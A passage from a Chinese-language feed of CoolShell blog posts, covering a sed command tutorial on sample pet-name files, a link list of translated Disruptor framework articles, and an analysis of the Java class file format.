$ sed "1 i This is my monkey, my monkey's name is wukong" my.txt
This is my monkey, my monkey's name is wukong
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my fish, my fish's name is george
This is my goat, my goat's name is adam

# 其中的1a表明，其要在最后一行后追加一行（append）
$ sed "$ a This is my monkey, my monkey's name is wukong" my.txt
This is my cat, my cat's name is betty
This is my monkey, my monkey's name is wukong
This is my dog, my dog's name is frank
This is my fish, my fish's name is george
This is my goat, my goat's name is adam</pre>
<p>我们可以运用匹配来添加文本：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="6"># 注意其中的/fish/a，这意思是匹配到/fish/后就追加一行
$ sed "/fish/a This is my monkey, my monkey's name is wukong" my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my fish, my fish's name is george
This is my monkey, my monkey's name is wukong
This is my goat, my goat's name is adam</pre>
<p>下面这个例子是对每一行都挺插入：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed "/my/a ----" my.txt
This is my cat, my cat's name is betty
----
This is my dog, my dog's name is frank
----
This is my fish, my fish's name is george
----
This is my goat, my goat's name is adam
----</pre>
<h5>
<span class="ez-toc-section" id="c%E5%91%BD%E4%BB%A4"></span>c命令<span class="ez-toc-section-end"></span>
</h5>
<p>c 命令是替换匹配行</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed "2 c This is my monkey, my monkey's name is wukong" my.txt
This is my cat, my cat's name is betty
This is my monkey, my monkey's name is wukong
This is my fish, my fish's name is george
This is my goat, my goat's name is adam

$ sed "/fish/c This is my monkey, my monkey's name is wukong" my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my monkey, my monkey's name is wukong
This is my goat, my goat's name is adam</pre>
<h5>
<span class="ez-toc-section" id="d%E5%91%BD%E4%BB%A4"></span>d命令<span class="ez-toc-section-end"></span>
</h5>
<p>删除匹配行</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed '/fish/d' my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my goat, my goat's name is adam

$ sed '2d' my.txt
This is my cat, my cat's name is betty
This is my fish, my fish's name is george
This is my goat, my goat's name is adam

$ sed '2,$d' my.txt
This is my cat, my cat's name is betty</pre>
<h5>
<span class="ez-toc-section" id="p%E5%91%BD%E4%BB%A4"></span>p命令<span class="ez-toc-section-end"></span>
</h5>
<p>打印命令</p>
<p>你可以把这个命令当成grep式的命令</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># 匹配fish并输出，可以看到fish的那一行被打了两遍，
# 这是因为sed处理时会把处理的信息输出
$ sed '/fish/p' my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my fish, my fish's name is george
This is my fish, my fish's name is george
This is my goat, my goat's name is adam

# 使用n参数就好了
$ sed -n '/fish/p' my.txt
This is my fish, my fish's name is george

# 从一个模式到另一个模式
$ sed -n '/dog/,/fish/p' my.txt
This is my dog, my dog's name is frank
This is my fish, my fish's name is george

#从第一行打印到匹配fish成功的那一行
$ sed -n '1,/fish/p' my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my fish, my fish's name is george</pre>
<h4>
<span class="ez-toc-section" id="%E5%87%A0%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9"></span>几个知识点<span class="ez-toc-section-end"></span>
</h4>
<p>好了，下面我们要介绍四个sed的基本知识点：</p>
<h5>
<span class="ez-toc-section" id="Pattern_Space"></span>Pattern Space<span class="ez-toc-section-end"></span>
</h5>
<p>第零个是关于-n参数的，大家也许没看懂，没关系，我们来看一下sed处理文本的伪代码，并了解一下Pattern Space的概念：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">foreach line in file {
    //放入把行Pattern_Space
    Pattern_Space &lt;= line;

    // 对每个pattern space执行sed命令
    Pattern_Space &lt;= EXEC(sed_cmd, Pattern_Space);

    // 如果没有指定 -n 则输出处理后的Pattern_Space
    if (sed option hasn't "-n")  {
       print Pattern_Space
    }
}</pre>
<h5>
<span class="ez-toc-section" id="Address"></span>Address<span class="ez-toc-section-end"></span>
</h5>
<p>第一个是关于address，几乎上述所有的命令都是这样的（注：其中的!表示匹配成功后是否执行命令）</p>
<p><strong>[address[,address]][!]{cmd}</strong></p>
<p>address可以是一个数字，也可以是一个模式，你可以通过逗号要分隔两个address 表示两个address的区间，参执行命令cmd，伪代码如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">bool bexec = false
foreach line in file {
    if ( match(address1) ){
        bexec = true;
    }

    if ( bexec == true) {
        EXEC(sed_cmd);
    }

    if ( match (address2) ) {
        bexec = false;
    }
}</pre>
<p>关于address可以使用相对位置，如：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># 其中的+3表示后面连续3行
$ sed '/dog/,+3s/^/# /g' pets.txt
This is my cat
  my cat's name is betty
# This is my dog
#   my dog's name is frank
# This is my fish
#   my fish's name is george
This is my goat
  my goat's name is adam</pre>
<h5>
<span class="ez-toc-section" id="%E5%91%BD%E4%BB%A4%E6%89%93%E5%8C%85"></span>命令打包<span class="ez-toc-section-end"></span>
</h5>
<p>第二个是cmd可以是多个，它们可以用分号分开，可以用大括号括起来作为嵌套命令。下面是几个例子：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="12,21,31">$ cat pets.txt
This is my cat
  my cat's name is betty
This is my dog
  my dog's name is frank
This is my fish
  my fish's name is george
This is my goat
  my goat's name is adam

# 对3行到第6行，执行命令/This/d
$ sed '3,6 {/This/d}' pets.txt
This is my cat
  my cat's name is betty
  my dog's name is frank
  my fish's name is george
This is my goat
  my goat's name is adam

# 对3行到第6行，匹配/This/成功后，再匹配/fish/，成功后执行d命令
$ sed '3,6 {/This/{/fish/d}}' pets.txt
This is my cat
  my cat's name is betty
This is my dog
  my dog's name is frank
  my fish's name is george
This is my goat
  my goat's name is adam

# 从第一行到最后一行，如果匹配到This，则删除之；如果前面有空格，则去除空格
$ sed '1,${/This/d;s/^ *//g}' pets.txt
my cat's name is betty
my dog's name is frank
my fish's name is george
my goat's name is adam </pre>
<h5>
<span class="ez-toc-section" id="Hold_Space"></span>Hold Space<span class="ez-toc-section-end"></span>
</h5>
<p>第三个我们再来看一下 Hold Space</p>
<p>接下来，我们需要了解一下Hold Space的概念，我们先来看四个命令：</p>
<p>g： 将hold space中的内容拷贝到pattern space中，原来pattern space里的内容清除<br>
G： 将hold space中的内容append到pattern space\n后<br>
h： 将pattern space中的内容拷贝到hold space中，原来的hold space里的内容被清除<br>
H： 将pattern space中的内容append到hold space\n后<br>
x： 交换pattern space和hold space的内容</p>
<p>这些命令有什么用？我们来看两个示例吧，用到的示例文件是：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat t.txt
one
two
three</pre>
<p>第一个示例：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ sed 'H;g' t.txt
one

one
two

one
two
three</pre>
<p>是不是有点没看懂，我作个图你就看懂了。</p>
<p><img alt="image placeholder" ></p>
<p>第二个示例，反序了一个文件的行：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ sed '1!G;h;$!d' t.txt
three
two
one</pre>
<p>其中的 ‘1!G;h;$!d’ 可拆解为三个命令</p>
<ul>
<li>1!G —— 只有第一行不执行G命令，将hold space中的内容append回到pattern space</li>
<li>h —— 第一行都执行h命令，将pattern space中的内容拷贝到hold space中</li>
<li>$!d —— 除了最后一行不执行d命令，其它行都执行d命令，删除当前行</li>
</ul>
<p>这个执行序列很难理解，做个图如下大家就明白了：</p>
<p><img alt="image placeholder" ></p>
<p>就先说这么多吧，希望对大家有用。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-02-20T08:36:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/9104.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 并发框架Disruptor译文 ]]></title>
<link>https://coolshell.cn/articles/9169.html</link>
<content><![CDATA[ 
<p><strong>（感谢同事<a href="http://ifeve.com" target="_blank">方腾飞</a>投递本文）</strong></p>
<p><img alt="image placeholder" >Martin Fowler在自己网站上写了一篇<a href="http://ifeve.com/lmax" target="_blank">LMAX架构</a>的文章，在文章中他介绍了LMAX是一种新型零售金融交易平台，它能够以很低的延迟产生大量交易。这个系统是建立在JVM平台上，其核心是一个业务逻辑处理器，它能够在一个线程里每秒处理6百万订单。业务逻辑处理器完全是运行在内存中，使用事件源驱动方式。业务逻辑处理器的核心是Disruptor。</p>
<p>Disruptor它是一个开源的并发框架，并获得<a href="https://www.java.net/dukeschoice" target="_blank">2011 Duke’s </a>程序框架创新奖，能够在无锁的情况下实现网络的Queue并发操作。本文是<a href="https://code.google.com/p/disruptor/wiki/BlogsAndArticles" target="_blank">Disruptor官网</a>中发布的文章的译文（<a href="https://lmax-exchange.github.com/disruptor/" target="_blank">现在被移到了GitHub</a>）。</p>
<h4><strong><span style="color: #008000">剖析Disruptor:为什么会这么快</span></strong></h4>
<ul>
<li><a href="http://ifeve.com/locks-are-bad/" target="_blank">剖析Disruptor:为什么会这么快？(一)锁的缺点</a></li>
</ul>
<ul>
<li><a title="剖析Disruptor:为什么会这么快？（二）神奇的缓存行填充" href="http://ifeve.com/disruptor-cacheline-padding/" target="_blank">剖析Disruptor:为什么会这么快？(二)神奇的缓存行填充</a></li>
</ul>
<ul>
<li><a title="伪共享(False Sharing)" href="http://ifeve.com/falsesharing/" target="_blank">剖析Disruptor:为什么会这么快？(三)伪共享</a></li>
</ul>
<ul>
<li><a title="剖析Disruptor:为什么会这么快？(四)揭秘内存屏障" href="http://ifeve.com/disruptor-memory-barrier/" target="_blank">剖析Disruptor:为什么会这么快？(四)揭秘内存屏障</a></li>
</ul>
<h4><span style="color: #008000">Disruptor如何工作和使用</span></h4>
<ul>
<li><a title="剖析Disruptor:为什么会这么快？（一）Ringbuffer的特别之处" href="http://ifeve.com/dissecting-disruptor-whats-so-special/" target="_blank">如何使用Disruptor（一）Ringbuffer的特别之处</a></li>
</ul>
<ul>
<li><a title="如何使用Disruptor（二）如何从Ringbuffer读取" href="http://ifeve.com/dissecting_the_disruptor_how_doi_read_from_the_ring_buffer/" target="_blank">如何使用Disruptor（二）如何从Ringbuffer读取</a></li>
</ul>
<ul>
<li><a title="如何使用 Disruptor（三）写入 Ringbuffer" href="http://ifeve.com/disruptor-writing-ringbuffer/" target="_blank">如何使用Disruptor（三）写入Ringbuffer</a></li>
</ul>
<p><span id="more-9169"></span></p>
<ul>
<li><a title="Disruptor(无锁并发框架)-发布" href="http://ifeve.com/the-disruptor-lock-free-publishing/" target="_blank">Disruptor(无锁并发框架)-发布</a></li>
</ul>
<ul>
<li><a title="LMAX Disruptor——一个高性能、低延迟且简单的框架" href="http://ifeve.com/disruptor-dsl/" target="_blank" rel="nofollow">LMAX Disruptor——一个高性能、低延迟且简单的框架</a></li>
</ul>
<ul>
<li><a title="Disruptor Wizard已死，Disruptor Wizard永存！" href="http://ifeve.com/disruptor-wizard/" target="_blank" rel="nofollow">Disruptor Wizard已死，Disruptor Wizard永存！</a></li>
</ul>
<ul>
<li><a title="Disruptor 2.0更新摘要" href="http://ifeve.com/disruptor-2-change/" target="_blank">Disruptor 2.0更新摘要</a></li>
</ul>
<ul>
<li><a title="线程间共享数据无需竞争" href="http://ifeve.com/sharing-data-among-threads-without-contention/" target="_blank">线程间共享数据不需要竞争</a></li>
</ul>
<h4><span style="color: #008000">Disruptor的应用</span></h4>
<ul>
<li><a title="LMAX架构" href="http://ifeve.com/lmax/" target="_blank">LMAX的架构</a></li>
</ul>
<ul>
<li><a title="通过Axon和Disruptor处理1M tps" href="http://ifeve.com/axon/" target="_blank">通过Axon和Disruptor处理1M tps</a></li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-02-28T20:13:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/9169.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 实例分析Java Class的文件结构 ]]></title>
<link>https://coolshell.cn/articles/9229.html</link>
<content><![CDATA[ 
<p><strong>【感谢网友 @<a title="Krq_Tiger" href="https://weibo.com/xmuzyq" target="_blank">Krq_Tiger</a> 投稿】</strong></p>
<p>今天把之前在Evernote中的笔记重新整理了一下，发上来供对java class 文件结构的有兴趣的同学参考一下。</p>
<p>学习Java的朋友应该都知道Java从刚开始的时候就打着平台无关性的旗号，说“一次编写，到处运行”，其实说到无关性，Java平台还有另外一个无关 性那就是语言无关性，要实现语言无关性，那么Java体系中的class的文件结构或者说是字节码就显得相当重要了，其实Java从刚开始的时候就有两套 规范，一个是Java语言规范，另外一个是Java虚拟机规范，Java语言规范只是规定了Java语言相关的约束以及规则，而虚拟机规范则才是真正从跨 平台的角度去设计的。今天我们就以一个实际的例子来看看，到底Java中一个Class文件对应的字节码应该是什么样子。 这篇文章将首先总体上阐述一下Class到底由哪些内容构成，然后再用一个实际的Java类入手去分析class的文件结构。</p>
<p>在继续之前，我们首先需要明确如下几点：</p>
<p style="padding-left: 30px;">1）Class文件是有8个字节为基础的字节流构成的，这些字节流之间都严格按照规定的顺序排列，并且字节之间不存在任何空隙，对于超过8个字节的数据，将按 照Big-Endian的顺序存储的，也就是说高位字节存储在低的地址上面，而低位字节存储到高地址上面，其实这也是class文件要跨平台的关键，因为 PowerPC架构的处理采用Big-Endian的存储顺序，而x86系列的处理器则采用Little-Endian的存储顺序，因此为了Class文 件在各中处理器架构下保持统一的存储顺序，虚拟机规范必须对起进行统一。</p>
<p style="padding-left: 30px;">2） Class文件结构采用类似C语言的结构体来存储数据的，主要有两类数据项，无符号数和表，无符号数用来表述数字，索引引用以及字符串等，比如 u1,u2,u4,u8分别代表1个字节，2个字节，4个字节，8个字节的无符号数，而表是有多个无符号数以及其它的表组成的复合结构。可能大家看到这里 对无符号数和表到底是上面也不是很清楚，不过不要紧，等下面实例的时候，我会再以实例来解释。</p>
<p>明确了上面的两点以后，我们接下来后来看看Class文件中按照严格的顺序排列的字节流都具体包含些什么数据：</p>
<p><span id="more-9229"></span></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;">（上图来自The Java Virtual Machine Specification Java SE 7 Edition)</p>
<p>在看上图的时候，有一点我们需要注意，比如cp_info，cp_info表示常量池，上图中用 constant_pool[constant_pool_count-1]的方式来表示常量池有constant_pool_count-1个常量，它 这里是采用数组的表现形式，但是大家不要误以为所有的常量池的常量长度都是一样的，其实这个地方只是为了方便描述采用了数组的方式，但是这里并不像编程语 言那里，一个int型的数组，每个int长度都一样。明确了这一点以后，我们在回过头来看看上图中每一项都具体代表了什么含义。</p>
<p>1）u4 magic 表示魔数，并且魔数占用了4个字节，魔数到底是做什么的呢？它其实就是表示一下这个文件的类型是一个Class文件，而不是一张JPG图片，或者AVI的电影。而Class文件对应的魔数是0xCAFEBABE.</p>
<p>2）u2 minor_version 表示Class文件的次版本号，并且此版本号是u2类型的无符号数表示。</p>
<p>3） u2 major_version 表示Class文件的主版本号，并且主版本号是u2类型的无符号数表示。major_version和minor_version主要用来表示当前的虚拟 机是否接受当前这种版本的Class文件。不同版本的Java编译器编译的Class文件对应的版本是不一样的。高版本的虚拟机支持低版本的编译器编译的 Class文件结构。比如Java SE 6.0对应的虚拟机支持Java SE 5.0的编译器编译的Class文件结构，反之则不行。</p>
<p>4） u2 constant_pool_count 表示常量池的数量。这里我们需要重点来说一下常量池是什么东西，请大家不要与Jvm内存模型中的运行时常量池混淆了，Class文件中常量池主要存储了字 面量以及符号引用，其中字面量主要包括字符串，final常量的值或者某个属性的初始值等等，而符号引用主要存储类和接口的全限定名称，字段的名称以及描 述符，方法的名称以及描述符，这里名称可能大家都容易理解，至于描述符的概念，放到下面说字段表以及方法表的时候再说。另外大家都知道Jvm的内存模型中 有堆，栈，方法区，程序计数器构成，而方法区中又存在一块区域叫运行时常量池，运行时常量池中存放的东西其实也就是编译器长生的各种字面量以及符号引用， 只不过运行时常量池具有动态性，它可以在运行的时候向其中增加其它的常量进去，最具代表性的就是String的intern方法。</p>
<p>5）cp_info 表示常量池，这里面就存在了上面说的各种各样的字面量和符号引用。放到常量池的中数据项在The Java Virtual Machine Specification Java SE 7 Edition 中一共有14个常量，每一种常量都是一个表，并且每种常量都用一个公共的部分tag来表示是哪种类型的常量。</p>
<p>下面分别简单描述一下具体细节等到后面的实例 中我们再细化。</p>
<ul>
<li>CONSTANT_Utf8_info      tag标志位为1,   UTF-8编码的字符串</li>
<li>CONSTANT_Integer_info  tag标志位为3， 整形字面量</li>
<li>CONSTANT_Float_info     tag标志位为4， 浮点型字面量</li>
<li>CONSTANT_Long_info     tag标志位为5， 长整形字面量</li>
<li>CONSTANT_Double_info  tag标志位为6， 双精度字面量</li>
<li>CONSTANT_Class_info    tag标志位为7， 类或接口的符号引用</li>
<li>CONSTANT_String_info    tag标志位为8，字符串类型的字面量</li>
<li>CONSTANT_Fieldref_info  tag标志位为9,  字段的符号引用</li>
<li>CONSTANT_Methodref_info  tag标志位为10，类中方法的符号引用</li>
<li>CONSTANT_InterfaceMethodref_info tag标志位为11, 接口中方法的符号引用</li>
<li>CONSTANT_NameAndType_info tag 标志位为12，字段和方法的名称以及类型的符号引用</li>
</ul>
<p style="text-align: center;">6） u2 access_flags 表示类或者接口的访问信息，具体如下图所示：<br>
<img alt="image placeholder" ></p>
<p>7）u2 this_class 表示类的常量池索引，指向常量池中CONSTANT_Class_info的常量</p>
<p>8）u2 super_class 表示超类的索引，指向常量池中CONSTANT_Class_info的常量</p>
<p>9）u2 interface_counts 表示接口的数量</p>
<p>10）u2 interface[interface_counts]表示接口表，它里面每一项都指向常量池中CONSTANT_Class_info常量</p>
<p>11）u2 fields_count 表示类的实例变量和类变量的数量</p>
<p>12） field_info fields[fields_count]表示字段表的信息，其中字段表的结构如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>上图中access_flags表示字段的访问表示，比如字段是public,private，protect 等，name_index表示字段名 称，指向常量池中类型是CONSTANT_UTF8_info的常量，descriptor_index表示字段的描述符，它也指向常量池中类型为 CONSTANT_UTF8_info的常量，attributes_count表示字段表中的属性表的数量，而属性表是则是一种用与描述字段，方法以及 类的属性的可扩展的结构，不同版本的Java虚拟机所支持的属性表的数量是不同的。</p>
<p>13） u2 methods_count表示方法表的数量</p>
<p>14）method_info 表示方法表，方法表的具体结构如下图所示：</p>
<p><img alt="image placeholder" ><br>
其中access_flags表示方法的访问表示，name_index表示名称的索引，descriptor_index表示方法的描述 符，attributes_count以及attribute_info类似字段表中的属性表，只不过字段表和方法表中属性表中的属性是不同的，比如方法 表中就Code属性，表示方法的代码，而字段表中就没有Code属性。其中具体Class中到底有多少种属性，等到Class文件结构中的属性表的时候再 说说。</p>
<p>15） attribute_count表示属性表的数量，说到属性表，我们需要明确以下几点：</p>
<ul>
<li>属性表存在于Class文件结构的最后，字段表，方法表以及Code属性中，也就是说属性表中也可以存在属性表</li>
<li>属性表的长度是不固定的，不同的属性，属性表的长度是不同的</li>
</ul>
<p>上面说完了Class文件结构中每一项的构成以后，我们以一个实际的例子来解释以下上面所说的内容。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">package com.ejushang.TestClass;

public class TestClass implements Super{

private static final int staticVar = 0;

private int instanceVar=0;

public int instanceMethod(int param){
 return param+1;
 }

}

interface Super{ }</pre>
<p>通过jdk1.6.0_37的javac 编译后的TestClass.java对应的TestClass.class的二进制结构如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>下面我们就根据前面所说的Class的文件结构来解析以下上图中字节流。</p>
<p><strong>1）魔数</strong><br>
从Class的文件结构我们知道，刚开始的4个字节是魔数，上图中从地址00000000h-00000003h的内容就是魔数，从上图可知Class的文件的魔数是0xCAFEBABE。</p>
<p><strong> 2）主次版本号</strong><br>
接下来的4个字节是主次版本号，有上图可知从00000004h-00000005h对应的是0x0000,因此Class的minor_version 为0x0000,从00000006h-00000007h对应的内容为0x0032,因此Class文件的major_version版本为 0x0032,这正好就是jdk1.6.0不带target参数编译后的Class对应的主次版本。</p>
<p><strong> 3）常量池的数量</strong><br>
接下来的2个字节从00000008h-00000009h表示常量池的数量，由上图可以知道其值为0x0018，十进制为24个,但是对于常量池的数量 需要明确一点，常量池的数量是constant_pool_count-1，为什么减一，是因为索引0表示class中的数据项不引用任何常量池中的常 量。</p>
<p><strong> 4）常量池</strong><br>
我们上面说了常量池中有不同类型的常量，下面就来看看TestClass.class的第一个常量，我们知道每个常量都有一个u1类型的tag标识来表示 常量的类型，上图中0000000ah处的内容为0x0A，转换成二级制是10，有上面的关于常量类型的描述可知tag为10的常量是Constant_Methodref_info,而Constant_Methodref_info的结够如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>其中class_index指向常量池中类型为CONSTANT_Class_info的常量，从TestClass的二进制文件结构中可以看出 class_index的值为0x0004（地址为0000000bh-0000000ch)，也就是说指向第四个常量。</p>
<p>name_and_type_index指向常量池中类型为CONSTANT_NameAndType_info常量。从上图可以看出name_and_type_index的值为0x0013，表示指向常量池中的第19个常量。</p>
<p>接下来又可以通过同样的方法来找到常量池中的所有常量。不过JDK提供了一个方便的工具可以让我们查看常量池中所包含的常量。通过javap -verbose TestClass 即可得到所有常量池中的常量，截图如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>从上图我们可以清楚的看到，TestClass中常量池有24个常量，不要忘记了第0个常量，因为第0个常量被用来表示 Class中的数据项不引用任何常量池中的常量。从上面的分析中我们得知TestClass的第一个常量表示方法，其中class_index指向的第四 个常量为java/lang/Object，name_and_type_index指向的第19个常量值为&lt;init&gt;:()V,从这里可 以看出第一个表示方法的常量表示的是java编译器生成的实例构造器方法。通过同样的方法可以分析常量池的其它常量。OK，分析完常量池，我们接下来再分 析下access_flags。<br>
<strong>5）u2 access_flags</strong> 表示类或者接口方面的访问信息，比如Class表示的是类还是接口，是否为public,static，final等。具体访问标示的含义之前已经说过 了，下面我们就来看看TestClass的访问标示。Class的访问标示是从0000010dh-0000010e，期值为0x0021，根据前面说的 各种访问标示的标志位，我们可以知道：0x0021=0x0001|0x0020 也即ACC_PUBLIC 和 ACC_SUPER为真，其中ACC_PUBLIC大家好理解，ACC_SUPER是jdk1.2之后编译的类都会带有的标志。</p>
<p><strong>6）u2 this_class</strong> 表示类的索引值，用来表示类的全限定名称，类的索引值如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>从上图可以清楚到看到，类索引值为0x0003，对应常量池的第三个常量，通过javap的结果，我们知道第三个常量为 CONSTANT_Class_info类型的常量，通过它可以知道类的全限定名称为：com/ejushang/TestClass /TestClass</p>
<p><strong> 7）u2 super_class</strong> 表示当前类的父类的索引值，索引值所指向的常量池中类型为CONSTANT_Class_info的常量，父类的索引值如下图所示，其值为0x0004, 查看常量池的第四个常量，可知TestClass的父类的全限定名称为：java/lang/Object</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>8）interfaces_count和  interfaces[interfaces_count]</strong>表示接口数量以及具体的每一个接口，TestClass的接口数量以及接口如下图所示，其中 0x0001表示接口数量为1，而0x0005表示接口在常量池的索引值，找到常量池的第五个常量，其类型为CONSTANT_Class_info，其 值为：com/ejushang/TestClass/Super</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><strong>9）fields_count 和 field_info</strong>, fields_count表示类中field_info表的数量，而field_info表示类的实例变量和类变量，这里需要注意的是 field_info不包含从父类继承过来的字段，field_info的结构如下图所示：<br>
<img alt="image placeholder" ></p>
<p style="text-align: center;">其中access_flags表示字段的访问标示，比如public,private,protected，static,final等，access_flags的取值如下图所示：<br>
<img alt="image placeholder" ></p>
<p style="text-align: left;">其中name_index 和 descriptor_index都是常量池的索引值，分别表示字段的名称和字段的描述符，字段的名称容易理解，但是字段的描述符如何理解呢？其实在JVM 规范中，对于字段的描述符规定如下图所示：<br>
<img alt="image placeholder" ><br>
其中大家需要关注一下上图最后一行，它表示的是对一维数组的描述符，对于String[][]的描述符将是[[ Ljava/lang/String,而对于int[][]的描述符为[[I。接下来的attributes_count以及 attribute_info分别表示属性表的数量以及属性表。下面我们还是以上面的TestClass为例，来看看TestClass的字段表吧。</p>
<p>首先我们来看一下字段的数量，TestClass的字段的数量如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>从上图中可以看出TestClass有两个字段，查看TestClass的源代码可知，确实也只有两个字段，接下来我们看看第一个字段，我们知道第一个字段应该为private int staticVar,它在Class文件中的二进制表示如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ><br>
其中0x001A表示访问标示，通过查看access_flags表可知，其为ACC_PRIVATE,ACC_STATIC,ACC_FINAL,接下 来0x0006和0x0007分别表示常量池中第6和第7个常量，通过查看常量池可知，其值分别为：staticVar和I，其中staticVar为字 段名称，而I为字段的描述符，通过上面对描述符的解释，I所描述的是int类型的变量，接下来0x0001表示staticVar这个字段表中的属性表的 数量，从上图可以staticVar字段对应的属性表有1个，0x0008表示常量池中的第8个常量，查看常量池可以得知此属性为 ConstantValue属性，而ConstantValue属性的格式如下图所示：<br>
<img alt="image placeholder" ></p>
<p>其中attribute_name_index表述属性名的常量池索引，本例中为ConstantValue，而ConstantValue的 attribute_length固定长度为2，而constantValue_index表示常量池中的引用，本例中，其中为0x0009，查看第9个 常量可以知道，它表示一个类型为CONSTANT_Integer_info的常量，其值为0。</p>
<p>上面说完了private static final int staticVar=0，下面我们接着说一下TestClass的private int instanceVar=0,在本例中对instanceVar的二进制表示如下图所示：</p>
<p style="text-align: left;"><img alt="image placeholder" ><br>
其中0x0002表示访问标示为ACC_PRIVATE,0x000A表示字段的名称，它指向常量池中的第10个常量，查看常量池可以知道字段名称为 instanceVar，而0x0007表示字段的描述符，它指向常量池中的第7个常量，查看常量池可以知道第7个常量为I，表示类型为 instanceVar的类型为I，最后0x0000表示属性表的数量为0.</p>
<p><strong> 10）methods_count 和 method_info</strong> ，其中methods_count表示方法的数量，而method_info表示的方法表，其中方法表的结构如下图所示：</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: left;">从上图可以看出method_info和field_info的结构是很类似的，方法表的access_flag的所有标志位以及取值如下图所示：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>其中name_index和descriptor_index表示的是方法的名称和描述符，他们分别是指向常量池的索引。这里需要结解释一下方法的描述 符，方法的描述符的结构为：（参数列表）返回值，比如public int instanceMethod(int param)的描述符为：（I）I，表示带有一个int类型参数且返回值也为int类型的方法，接下来就是属性数量以及属性表了，方法表和字段表虽然都有 属性数量和属性表，但是他们里面所包含的属性是不同。接下来我们就以TestClass来看一下方法表的二进制表示。首先来看一下方法表数量，截图如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ><br>
从上图可以看出方法表的数量为0x0002表示有两个方法，接下来我们来分析第一个方法，我们首先来看一下TestClass的第一个方法的access_flag，name_index,descriptor_index，截图如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ><br>
从上图可以知道access_flags为0x0001，从上面对access_flags标志位的描述，可知方法的access_flags的取值为 ACC_PUBLIC,name_index为0x000B，查看常量池中的第11个常量，知道方法的名称为&lt;init&gt;，0x000C表示 descriptor_index表示常量池中的第12常量，其值为()V,表示&lt;init&gt;方法没有参数和返回值，其实这是编译器自动生成 的实例构造器方法。接下来的0x0001表示&lt;init&gt;方法的方法表有1个属性，属性截图如下：<br>
<img alt="image placeholder" ><br>
从上图可以看出0x000D对应的常量池中的常量为Code,表示的方法的Code属性，所以到这里大家应该明白方法的那些代码是存储在Class文件方法表中的属性表中的Code属性中。接下来我们在分析一下Code属性，Code属性的结构如下图所示：<br>
<img alt="image placeholder" ></p>
<p>其中attribute_name_index指向常量池中值为Code的常量，attribute_length的长度表示Code属性表的长度（这里 需要注意的时候长度不包括attribute_name_index和attribute_length的6个字节的长度）。</p>
<p>max_stack表示最大栈深度，虚拟机在运行时根据这个值来分配栈帧中操作数的深度，而max_locals代表了局部变量表的存储空间。</p>
<p>max_locals的单位为slot，slot是虚拟机为局部变量分配内存的最小单元，在运行时，对于不超过32位类型的数据类型，比如 byte,char,int等占用1个slot，而double和Long这种64位的数据类型则需要分配2个slot，另外max_locals的值并 不是所有局部变量所需要的内存数量之和，因为slot是可以重用的，当局部变量超过了它的作用域以后，局部变量所占用的slot就会被重用。</p>
<p>code_length代表了字节码指令的数量，而code表示的时候字节码指令，从上图可以知道code的类型为u1,一个u1类型的取值为0x00-0xFF,对应的十进制为0-255，目前虚拟机规范已经定义了200多条指令。</p>
<p>exception_table_length以及exception_table分别代表方法对应的异常信息。</p>
<p>attributes_count和attribute_info分别表示了Code属性中的属性数量和属性表，从这里可以看出Class的文件结构中，属性表是很灵活的，它可以存在于Class文件，方法表，字段表以及Code属性中。</p>
